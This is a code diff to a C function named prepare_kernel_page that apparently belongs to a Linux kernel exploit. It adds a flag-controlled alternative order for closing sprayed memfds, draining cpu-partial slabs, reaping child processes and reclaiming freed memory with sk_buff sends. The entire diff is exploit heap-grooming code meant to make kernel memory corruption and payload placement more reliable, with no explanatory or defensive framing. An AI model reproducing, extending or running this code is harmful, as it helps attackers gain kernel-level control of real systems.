@@ -1435,6 +1435,21 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   sched_yield();
   sched_yield();
   sched_yield();
+#if defined(APP_UPSTREAM_MM_RECLAIM_ORDER) && \
+    APP_UPSTREAM_MM_RECLAIM_ORDER
+  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
+    SYSCHK(close(pre_ctx.memfds[i]));
+    pre_ctx.memfds[i] = -1;
+  }
+  for (size_t i = 0; i < post_ctx.mm_cnt - 1; i++) {
+    SYSCHK(close(post_ctx.memfds[i]));
+    post_ctx.memfds[i] = -1;
+  }
+  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
+    SYSCHK(close(spray_ctx.memfds[i]));
+    spray_ctx.memfds[i] = -1;
+  }
+#else
   for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
     SYSCHK(close(spray_ctx.memfds[i]));
     spray_ctx.memfds[i] = -1;
@@ -1459,6 +1474,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     !(defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW)
   log_mm_slabinfo("after-target-neighbors");
 #endif
+#endif
 
   SYSCHK(close(pcp_shaping_sv[0]));
   SYSCHK(close(pcp_shaping_sv[1]));
@@ -1468,6 +1484,10 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   sched_yield();
   SYSCHK(close(memfd_leak));
   memfd_leak = -1;
+#if defined(APP_UPSTREAM_MM_RECLAIM_ORDER) && \
+    APP_UPSTREAM_MM_RECLAIM_ORDER
+  size_t drain_triggers = 0;
+#else
   size_t drain_triggers = prepare_ctx.mm_cnt / mm_objs_per_slab;
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 #ifdef APP_MM_LATE_DRAIN_TRIGGERS
@@ -1518,6 +1538,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     kill_child(prepare_ctx.childs[index]);
     prepare_ctx.childs[index] = -1;
   }
+#endif
 #if !defined(APP_REQUIRE_FRESH_P0_SESSION) || !APP_REQUIRE_FRESH_P0_SESSION
   pr_info("mm late cpu-partial drain triggers=%zu\n", drain_triggers);
 #endif
@@ -1541,6 +1562,8 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     reclaim_sent++;
   }
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+#if !defined(APP_UPSTREAM_MM_RECLAIM_ORDER) || \
+    !APP_UPSTREAM_MM_RECLAIM_ORDER
   for (size_t i = 0; i < deferred_reap_count; i++) {
     SYSCHK(waitpid(deferred_reap_children[i], NULL, 0));
     pr_info("mm drain child reaped after reclaim index=%zu/%zu pid=%d\n",
@@ -1549,6 +1572,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 #if defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW
   pr_info("mm quiet reclaim window completed deferred-exits=%zu\n",
           deferred_reap_count);
+#endif
 #endif
   pr_info("mm late cpu-partial drain triggers=%zu\n", drain_triggers);
   pr_info("sk_buff reclaim sends=%d/%d mode=%d stop_errno=%d\n",
